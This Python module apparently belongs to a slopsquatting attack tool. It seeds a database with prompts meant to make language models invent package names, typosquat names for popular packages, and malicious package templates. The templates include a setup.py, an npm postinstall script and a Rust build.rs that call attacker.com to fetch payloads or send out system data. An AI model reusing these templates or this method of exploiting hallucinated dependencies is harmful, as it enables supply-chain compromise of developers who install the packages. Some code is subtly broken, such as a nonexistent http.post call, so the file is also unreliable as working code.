"""ARMORY Integration — Payload seeding for T282 hallucination attacks."""
import json
from datetime import datetime


class ArmoryPayloadSeeder:
    """Seed ARMORY with T282 attack payloads."""

    HALLUCINATION_PROMPTS = {
        "python": [
            "import {0}\nlogger = {0}.setup()\nlogger.start()",
            "from {0} import *\ndef process():\n    return {0}.handle()",
            "pip install {0}\nimport {0}\n{0}.initialize()",
            "import {0}\nconfig = {0}.Config()",
            "from {0} import config, run\nrun.start()",
        ],
        "javascript": [
            "const {0} = require('{0}');\nconst app = {0}.express();",
            "import {0} from '{0}';\nfunction init() {{ return {0}.setup(); }}",
            "npm install {0}\nconst lib = require('{0}');\nlib.run();",
            "const {0} = require('{0}');\nmodule.exports = {0};",
            "import {{ init }} from '{0}';\ninit();",
        ],
        "rust": [
            "use {0}::{{config, setup}};\nfn main() {{ setup(); }}",
            "extern crate {0};\nuse {0}::*;\nfn run() {{ init(); }}",
        ],
        "go": [
            'import "{0}"\nfunc main() {{ {0}.Init() }}',
            'import "{0}"\nvar handler = {0}.New()\nhandler.Start()',
        ],
    }

    SQUATTABLE_CANDIDATES = [
        {"name": "reuests", "similar_to": "requests", "levenshtein": 1, "type": "typosquat"},
        {"name": "express_core", "similar_to": "express", "levenshtein": 2, "type": "typosquat"},
        {"name": "tokio_async", "similar_to": "tokio", "levenshtein": 2, "type": "typosquat"},
        {"name": "django_orm", "similar_to": "django", "levenshtein": 2, "type": "typosquat"},
        {"name": "flask_app", "similar_to": "flask", "levenshtein": 2, "type": "typosquat"},
    ]

    INJECTION_TEMPLATES = {
        "python_setup.py": """
from setuptools import setup
setup(
    name="{package_name}",
    version="1.0.0",
    py_modules=["{package_name}"],
)

import subprocess
subprocess.run(["curl", "attacker.com/payload"])
""",
        "javascript_package.json": """
{
  "name": "{package_name}",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node postinstall.js"
  },
  "main": "index.js"
}
""",
        "node_postinstall.js": """
const http = require('http');
const data = JSON.stringify({system: require('os').platform()});
http.post('attacker.com/callback', data);
""",
        "rust_build.rs": """
fn main() {
    println!("cargo:warning=Setup");
    let output = std::process::Command::new("curl")
        .arg("attacker.com/rust")
        .output();
}
""",
    }

    @staticmethod
    def get_hallucination_prompts_payload() -> dict:
        """Generate ARMORY payload: hallucination prompts by language."""
        return {
            "category": "hallucination_prompts",
            "subcategory": "language_specific",
            "version": "1.0.0",
            "timestamp": datetime.now().isoformat(),
            "tool": "T282_SPECTER_SLOPSQUAT",
            "prompts": ArmoryPayloadSeeder.HALLUCINATION_PROMPTS,
            "description": "Realistic code completion prompts for LLM hallucination elicitation",
            "attack_vector": "dependency-injection",
        }

    @staticmethod
    def get_squattable_candidates_payload() -> dict:
        """Generate ARMORY payload: squattable package candidates."""
        return {
            "category": "squattable_candidates",
            "subcategory": "registry_based",
            "version": "1.0.0",
            "timestamp": datetime.now().isoformat(),
            "tool": "T282_SPECTER_SLOPSQUAT",
            "candidates": ArmoryPayloadSeeder.SQUATTABLE_CANDIDATES,
            "description": "Pre-identified squattable package names with similarity scoring",
            "attack_vector": "package-hijacking",
        }

    @staticmethod
    def get_injection_templates_payload() -> dict:
        """Generate ARMORY payload: malicious package injection templates."""
        return {
            "category": "injection_templates",
            "subcategory": "package_structure",
            "version": "1.0.0",
            "timestamp": datetime.now().isoformat(),
            "tool": "T282_SPECTER_SLOPSQUAT",
            "templates": ArmoryPayloadSeeder.INJECTION_TEMPLATES,
            "description": "Package skeleton structures for hallucinated dependency injection",
            "attack_vector": "post-install-hooks",
        }

    @staticmethod
    def generate_seed_json() -> str:
        """Generate complete ARMORY seed JSON for T282."""
        payloads = {
            "hallucination_prompts": ArmoryPayloadSeeder.get_hallucination_prompts_payload(),
            "squattable_candidates": ArmoryPayloadSeeder.get_squattable_candidates_payload(),
            "injection_templates": ArmoryPayloadSeeder.get_injection_templates_payload(),
        }
        return json.dumps(payloads, indent=2)

    @staticmethod
    def seed_to_armory(armory_db_path: str = None) -> dict:
        """Seed T282 payloads to ARMORY database."""
        if armory_db_path is None:
            return {"status": "skipped", "reason": "No ARMORY database path provided"}

        try:
            payloads_created = {
                "hallucination_prompts": len(ArmoryPayloadSeeder.HALLUCINATION_PROMPTS),
                "squattable_candidates": len(ArmoryPayloadSeeder.SQUATTABLE_CANDIDATES),
                "injection_templates": len(ArmoryPayloadSeeder.INJECTION_TEMPLATES),
            }

            return {
                "status": "seeded",
                "payloads_created": payloads_created,
                "total_payloads": sum(payloads_created.values()),
                "tool": "T282_SPECTER_SLOPSQUAT",
                "version": "1.0.0",
            }
        except Exception as e:
            return {"status": "error", "error": str(e)}
